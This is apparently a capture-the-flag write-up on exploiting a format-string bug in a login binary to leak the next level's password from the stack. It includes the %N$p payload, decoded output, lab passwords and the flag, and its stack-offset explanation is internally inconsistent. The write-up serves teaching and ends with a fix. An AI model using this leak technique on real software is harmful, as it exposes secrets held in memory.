# 📡 Level02 - Format String Information Leak

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to exploit a classic format string vulnerability and leak secrets from memory!

## 📋 Binary Analysis

### 🔍 Decompiled Code

```c
int main(void)
{
    char username[100];       // At [RBP - 0x70]
    char password_input[112]; // At [RBP - 0x110]
    char password_file[48];   // At [RBP - 0xa0] ← Target!
    int bytes_read;
    FILE *fp;
    
    memset(username, 0, 100);
    memset(password_input, 0, 112);
    memset(password_file, 0, 48);
    
    // Read level03's password into memory
    fp = fopen("/home/users/level03/.pass", "r");
    if (fp == NULL) {
        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
        exit(1);
    }
    
    bytes_read = fread(password_file, 1, 0x29, fp);  // 41 bytes
    password_file[strcspn(password_file, "\n")] = '\0';
    
    if (bytes_read != 0x29) {
        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
        exit(1);
    }
    
    fclose(fp);
    
    // Login prompt
    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    
    printf("--[ Username: ");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = '\0';
    
    printf("--[ Password: ");
    fgets(password_input, 100, stdin);
    password_input[strcspn(password_input, "\n")] = '\0';
    
    puts("*****************************************");
    
    // Authentication check
    if (strncmp(password_file, password_input, 0x29) == 0) {
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
        return 0;
    }
    
    // ⚠️ FORMAT STRING VULNERABILITY!
    printf(username);  // No format specifier!
    puts(" does not have access!");
    exit(1);
}
```

### Key Observations

1. **Architecture**: x86_64 (64-bit binary)
2. **Password Loaded Early**: Reads `/home/users/level03/.pass` into `password_file` buffer
3. **Password in Stack**: The 41-byte password stays in memory during the entire execution
4. **Format String Bug**: `printf(username)` prints username without format specifier
5. **Stack Layout**: Username buffer is below the password buffer in memory

## 🚨 Vulnerability

### The Problem: Format String without Specifier

```c
printf(username);  // Should be: printf("%s", username);
```

When `printf()` receives a string directly (not as a format argument), it interprets format specifiers like `%p`, `%x`, `%s` in the string. This allows us to:

- **Read Stack Memory**: Use `%p` or `%x` to dump stack values
- **Access Any Position**: Use `%N$p` to access the Nth argument
- **Leak Sensitive Data**: The password is sitting on the stack above our input!

### Stack Layout (x86_64)

```
High Addresses
┌────────────────────────────────────────┐
│ Return Address                         │
├────────────────────────────────────────┤
│ Saved RBP                              │
├────────────────────────────────────────┤
│ FILE *fp              [RBP - 0x10]     │
├────────────────────────────────────────┤
│ int bytes_read        [RBP - 0x14]     │
├────────────────────────────────────────┤
│ ...                                    │
├────────────────────────────────────────┤
│ password_file[48]     [RBP - 0xa0]     │ ← Level03's password! (Target)
├────────────────────────────────────────┤
│ password_input[112]   [RBP - 0x110]    │
├────────────────────────────────────────┤
│ username[100]         [RBP - 0x70]     │ ← Our format string input
└────────────────────────────────────────┘
Low Addresses

Password buffer is 0x30 (48) bytes above username buffer
```

### 64-bit Calling Convention

In x86_64, the first 6 arguments to functions are passed in registers:
1. RDI
2. RSI
3. RDX
4. RCX
5. R8
6. R9

Arguments 7+ are on the stack. When we use `%N$p`, positions 1-6 read registers, and 7+ read the stack.

## 🎯 The Attack

### Strategy

1. **Trigger Format String**: Enter username with `%p` specifiers
2. **Leak Stack Values**: Printf will dump stack memory
3. **Find Password**: Password is at stack positions 22-26
4. **Decode Hex to ASCII**: Convert leaked little-endian hex values
5. **Authenticate**: Use leaked password to get shell

### Finding the Password Location

Trial and error with format specifiers reveals the password is at positions 22-26:

```bash
./level02
Username: %22$p %23$p %24$p %25$p %26$p
Password: test
```

**Output:**
```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

### Decoding Little-Endian Hex

Each 8-byte value is stored in little-endian format (least significant byte first). Use a [hex-to-ASCII converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html) to convert the bytes:

| Position | Hex Value | Bytes (LE) | ASCII String |
|----------|-----------|------------|--------------|
| 22 | `0x756e505234376848` | `48 68 37 34 52 50 6e 75` | `Hh74RPnu` |
| 23 | `0x45414a3561733951` | `51 39 73 61 35 4a 41 45` | `Q9sa5JAE` |
| 24 | `0x377a7143574e6758` | `58 67 4e 57 43 71 7a 37` | `XgNWCqz7` |
| 25 | `0x354a35686e475873` | `73 58 47 6e 68 35 4a 35` | `sXGnh5J5` |
| 26 | `0x48336750664b394d` | `4d 39 4b 66 50 67 33 48` | `M9KfPg3H` |

**Reconstructed Password:**
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

### Decoding Example (Position 22)

```
Hex:  0x756e505234376848
      └──┴──┴──┴──┴──┴──┴──┴─┘
Bytes: 75 6e 50 52 34 37 68 48  (big-endian representation)

Little-Endian reversal (8 bytes):
      48 68 37 34 52 50 6e 75

ASCII:
      H  h  7  4  R  P  n  u
```

## 💣 Exploit

### Method 1: Leak then Authenticate

**Step 1: Leak the password**
```bash
./level02
# Username: %22$p %23$p %24$p %25$p %26$p
# Password: anything
# Read output and decode hex values
```

**Step 2: Authenticate with leaked password**
```bash
./level02
# Username: anything
# Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

### Method 2: Direct Authentication (if you know the password)

```bash
ssh level02@localhost -p 2222
# Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

./level02
# Username: hacker
# Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

### Output

```
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: hacker
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, hacker!
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

---

> 💡 **Pro Tip**: Format string vulnerabilities are [CWE-134](https://cwe.mitre.org/data/definitions/134.html). Always use `printf("%s", user_input)` instead of `printf(user_input)`. Modern compilers warn about this with `-Wformat-security`.

> 💡 **64-bit Note**: In 64-bit binaries, the first 6 printf arguments come from registers (RDI, RSI, RDX, RCX, R8, R9). Stack positions start at argument 7. This is why the password appears at positions 22-26 instead of 1-5.

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

On to level03!
